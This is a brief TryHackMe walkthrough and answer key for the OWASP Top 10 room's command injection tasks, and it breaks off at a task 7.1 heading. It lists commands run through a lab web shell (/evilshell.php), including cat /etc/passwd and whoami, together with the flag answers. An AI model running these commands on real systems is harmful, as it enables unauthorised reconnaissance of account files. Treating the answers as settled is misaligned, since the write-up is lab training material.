# TryhackMe: OWASP Top 10

Part of tryhackme's "Complete Beginner" path

## Task 1: Introduction

Just Reading

## Task 2: Accessing machines

Just Reading

## Task 3: [Severity 1] Injection

Just Reading

## Task 4: [Severity 1] OS Command Injection

Just Reading

## Task 5: [Severity 1] Command Injection Practical

### 5.1

What strange text file is in the website root directory?
<br/>
Navigate to the /evilshell.php, and execute "ls"
<br/>
Answer: drpepper.txt

### 5.2

How many non-root/non-service/non-daemon users are there?
<br/>
Command used: cat /etc/passwd
<br/>
Answer: 0

### 5.3

What user is this app running as?
<br/>
Command: whoami
<br/>
Answer: www-data

### 5.4

What is the user's shell set as?
<br/>
Command: cat /etc/passwd | grep www-data
<br/>
Answer: /usr/sbin/nologin

### 5.5

What version of Ubuntu is running?
<br/>
Command: lsb_release -a
<br/>
Answer: 18.04.4

#### 5.6

Print out the MOTD. What favorite beverage is shown?
<br/>
Command: cat /etc/update-motd.d/00-header
<br/>
Answer: DR PEPPER

## Task 6: [Severity 2] Broken Authentication

Just Reading

## Task 7: [Severity 2] Broken Authentication Practical

### 7.1
